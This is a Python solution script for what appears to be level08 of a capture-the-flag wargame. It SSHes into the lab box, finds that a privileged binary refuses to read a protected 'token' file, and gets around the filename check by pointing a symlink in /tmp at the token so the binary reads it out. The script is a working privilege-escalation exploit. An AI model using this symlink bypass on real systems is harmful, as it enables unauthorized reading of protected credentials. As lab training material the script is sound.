import sys

sys.path.append("../..")

from utils.ssh import connect_by_previous, exec, get_token
from utils.text import print_title, print_output

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list)

output = exec(client, './level08', title='Try to execute')
print_output(output, 'Output')
print_title('Looks like we can give file path via argv')

output = exec(client, './level08 token', title='Try to execute with token file')
print_output(output, 'Output')
print_title('Not access to read')

exec(client, 'ln -s ~/token /tmp/tkn', title='Try to symbol link trick')

flag_password = exec(client, './level08 /tmp/tkn', title='Execute with our link file')[0]
print_output(flag_password, 'Output')

exec(client, 'rm -f /tmp/tkn', title='Remove tmp file')

get_token(flag_password)

client.close()
